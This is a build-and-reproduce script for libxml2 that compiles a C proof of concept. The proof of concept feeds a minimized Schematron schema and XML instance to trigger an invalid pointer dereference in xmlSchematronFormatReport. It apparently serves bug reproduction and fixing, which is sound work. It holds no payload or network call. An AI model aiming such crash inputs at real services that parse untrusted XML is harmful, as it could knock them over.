#!/bin/bash
./autogen.sh
./configure --prefix=$PWD/install --with-zlib --with-lzma --with-schematron
make -j8
make install

cat <<EOF > poc.c
#include <stdio.h>
#include <string.h>
#include <libxml/parser.h>
#include <libxml/schematron.h>

// Minimal PoC to reproduce the undefined behavior in xmlSchematronFormatReport
// when accessing node->ns->prefix with corrupted pointer (0xffffffffffffffff)
int main() {
    // Minimized crash data
    const char* schema_xml = "<sch:schema xmlns:sch=\"http://purl.oclc.org/dsdl/schematron\"><sch:pattern id=\"\"><sch:rule context=\"boo0\"><sch:report test=\"not(0)\"><sch:name path=\"/\"/></sch:report></sch:rule></sch:pattern></sch:schema>";
    const char* instance_xml = "<librar0><boo0/></librar0>";

    xmlInitParser();
    
    // Parse schema
    xmlDocPtr schemaDoc = xmlReadMemory(schema_xml, strlen(schema_xml), "schema.xml", NULL, 
                                       XML_PARSE_NOENT | XML_PARSE_NONET);
    if (!schemaDoc) {
        printf("Failed to parse schema\n");
        return 1;
    }

    // Create schematron parser context
    xmlSchematronParserCtxtPtr parserCtxt = xmlSchematronNewDocParserCtxt(schemaDoc);
    if (!parserCtxt) {
        printf("Failed to create parser context\n");
        xmlFreeDoc(schemaDoc);
        return 1;
    }

    // Parse schematron schema
    xmlSchematronPtr schema = xmlSchematronParse(parserCtxt);
    if (!schema) {
        printf("Failed to parse schematron\n");
        xmlSchematronFreeParserCtxt(parserCtxt);
        xmlFreeDoc(schemaDoc);
        return 1;
    }

    // Parse instance document
    xmlDocPtr instanceDoc = xmlReadMemory(instance_xml, strlen(instance_xml), "instance.xml", NULL,
                                         XML_PARSE_NOENT | XML_PARSE_NONET);
    if (!instanceDoc) {
        printf("Failed to parse instance\n");
        xmlSchematronFree(schema);
        xmlSchematronFreeParserCtxt(parserCtxt);
        xmlFreeDoc(schemaDoc);
        return 1;
    }

    // Create validation context
    xmlSchematronValidCtxtPtr validCtxt = xmlSchematronNewValidCtxt(schema, 0);
    if (!validCtxt) {
        printf("Failed to create validation context\n");
        xmlFreeDoc(instanceDoc);
        xmlSchematronFree(schema);
        xmlSchematronFreeParserCtxt(parserCtxt);
        xmlFreeDoc(schemaDoc);
        return 1;
    }

    printf("Validating document (this should trigger undefined behavior)...\n");
    // This should trigger the crash in xmlSchematronFormatReport 
    // at line 1442: node->ns->prefix with corrupted pointer 0xffffffffffffffff
    int result = xmlSchematronValidateDoc(validCtxt, instanceDoc);
    printf("Validation result: %d (should not reach here if crash occurs)\n", result);

    // Cleanup
    xmlSchematronFreeValidCtxt(validCtxt);
    xmlFreeDoc(instanceDoc);
    xmlSchematronFree(schema);
    xmlSchematronFreeParserCtxt(parserCtxt);
    xmlFreeDoc(schemaDoc);
    xmlCleanupParser();

    printf("Test completed successfully\n");
    return 0;
} 
EOF

if [ ! -z "${CC:-}" ]; then
    $CC $CFLAGS -I./install/include/libxml2 -L./install/lib -Wl,-rpath=$PWD/install/lib -lxml2 -lz -llzma -lm -o poc poc.c
fi